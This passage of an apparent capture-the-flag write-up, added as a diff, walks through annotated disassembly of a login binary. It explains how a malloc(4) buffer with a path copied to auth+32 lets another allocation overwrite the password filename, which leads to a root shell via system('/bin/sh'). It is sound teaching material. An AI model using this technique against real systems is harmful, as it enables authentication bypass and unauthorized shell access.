+   0x080487dd <+540>:  call   0x8057950 <strtok>                # strtok(<password>,"\r\n")
+   0x080487e2 <+545>:  mov    DWORD PTR [esp+0x9c],eax          # stack(156) = password
+   0x080487e9 <+552>:  mov    DWORD PTR [esp+0x4],0x80abad4     # arg2="\r\n"
+   0x080487f1 <+560>:  mov    DWORD PTR [esp],0x80cc2e0         # <yourpassword>
+   0x080487f8 <+567>:  call   0x8057950 <strtok>                # strtok(<yourpassword>,"\r\n")
+   0x080487fd <+572>:  mov    DWORD PTR [esp+0x98],eax          # stack(152) = yourpassword
+   0x08048804 <+579>:  mov    DWORD PTR [esp+0x8],0x20          # arg3=32
+   0x0804880c <+587>:  mov    eax,DWORD PTR [esp+0x98]          # arg2=yourpassword
+   0x08048813 <+594>:  mov    DWORD PTR [esp+0x4],eax
+   0x08048817 <+598>:  mov    eax,DWORD PTR [esp+0x9c]          # arg1=password
+   0x0804881e <+605>:  mov    DWORD PTR [esp],eax
+   0x08048821 <+608>:  call   0x8056d80 <strncmp>               # strncmp(password,yourpassword,32)
+   0x08048826 <+613>:  test   eax,eax                           # password match?
+   0x08048828 <+615>:  jne    0x804886d <main+684>              # if not, jump to err msg
+   0x0804882a <+617>:  mov    eax,ds:0x80ca4c0                  # arg4=STDOUT
+   0x0804882f <+622>:  mov    DWORD PTR [esp+0xc],eax
+   0x08048833 <+626>:  mov    DWORD PTR [esp+0x8],0x28          # arg3=40
+   0x0804883b <+634>:  mov    DWORD PTR [esp+0x4],0x1           # arg2=1
+   0x08048843 <+642>:  mov    DWORD PTR [esp],0x80abc4c         # arg1="Access Granted!\r\nDropping into /bin/sh\r\n"
+   0x0804884a <+649>:  call   0x804a220 <fwrite>                # fwrite("Access Granted!\r\nDropping into /bin/sh\r\n")
+   0x0804884f <+654>:  mov    eax,ds:0x80ca4c0                  # STDOUT
+   0x08048854 <+659>:  mov    DWORD PTR [esp],eax
+   0x08048857 <+662>:  call   0x8049b70 <fflush>                # fflush(STDOUT)
+   0x0804885c <+667>:  mov    DWORD PTR [esp],0x80abc75         # "/bin/sh"
+   0x08048863 <+674>:  call   0x8049860 <system>                # system("/bin/sh")
+   0x08048868 <+679>:  jmp    0x80485d4 <main+19>
+   0x0804886d <+684>:  mov    eax,ds:0x80ca4c0                  # STDOUT
+   0x08048872 <+689>:  mov    DWORD PTR [esp+0xc],eax
+   0x08048876 <+693>:  mov    DWORD PTR [esp+0x8],0x10
+   0x0804887e <+701>:  mov    DWORD PTR [esp+0x4],0x1
+   0x08048886 <+709>:  mov    DWORD PTR [esp],0x80abc7d         # "Access Denied!\r\n"
+   0x0804888d <+716>:  call   0x804a220 <fwrite>                # fwrite("Access Denied!\r\n")
+   0x08048892 <+721>:  jmp    0x80485d4 <main+19>
+   0x08048897 <+726>:  nop
+   0x08048898 <+727>:  leave  
+   0x08048899 <+728>:  ret    
+
+The exploit comes around the usage of "auth" (080cc2c0 B auth). In response to "username", 4 bytes are allocated and initialized to 0. The first error is that this is not big enough to hold the filename "/root/password.txt". But that error is compounded by not using the auth pointer, but the pointer auth+32 (points to 32 bytes after auth). That's someplace else in memory, presumably used by some other heap allocation.
+
+.. code-block:: objdump
+
+   0x08048711 <+336>:  call   0x8056d80 <strncmp>               # strncmp(input,"username ",9)
+   0x08048716 <+341>:  test   eax,eax                           # input="username"?
+   0x08048718 <+343>:  jne    0x8048768 <main+423>              # no, skip to *login* check
+   0x0804871a <+345>:  mov    DWORD PTR [esp],0x4
+   0x08048721 <+352>:  call   0x8055550 <malloc>                # malloc(4)
+   0x08048726 <+357>:  mov    ds:0x80cc2c0,eax                  # <auth>=malloc(4)
+   0x0804872b <+362>:  mov    eax,ds:0x80cc2c0                  # 
+   0x08048730 <+367>:  mov    DWORD PTR [esp+0x8],0x4           # arg3=4
+   0x08048738 <+375>:  mov    DWORD PTR [esp+0x4],0x0           # arg2=0
+   0x08048740 <+383>:  mov    DWORD PTR [esp],eax               # arg1=<auth>
+   0x08048743 <+386>:  call   0x8057cc0 <memset>                # memset(<auth>,0,4)
+   0x08048748 <+391>:  mov    eax,ds:0x80cc2c0                  # <auth>
+   0x0804874d <+396>:  add    eax,0x20                          # <auth>+32
+   0x08048750 <+399>:  mov    DWORD PTR [esp+0x8],0x1f          # arg3=31
+   0x08048758 <+407>:  mov    DWORD PTR [esp+0x4],0x80abc12     # arg2="/root/password.txt"
+   0x08048760 <+415>:  mov    DWORD PTR [esp],eax               # arg1=<auth>+32
+   0x08048763 <+418>:  call   0x8056e30 <strncpy>               # <auth>+32="/root/password.txt"
+
+So it stores the filename :file:`/root/password.txt` in the wrong place (auth+32), but at least is consistent when reading the filename by reading it from auth+32:
+
+.. code-block:: objdump
+
+   0x080486c8 <+263>:  mov    eax,ds:0x80cc2c0                  # arg1=<auth>[32:]
+   0x080486cd <+268>:  add    eax,0x20
+   0x080486d0 <+271>:  mov    DWORD PTR [esp],eax
+   0x080486d3 <+274>:  call   0x80484be <loadPasswordFromFile>  # call loadPasswordFromFile
+
+So if we run "username" first, the filename is set to :file:`/root/password.txt`. However, the real owner of that memory can later overwrite overwrite it to some other filename, say :file:`/tmp/password.txt`.
+
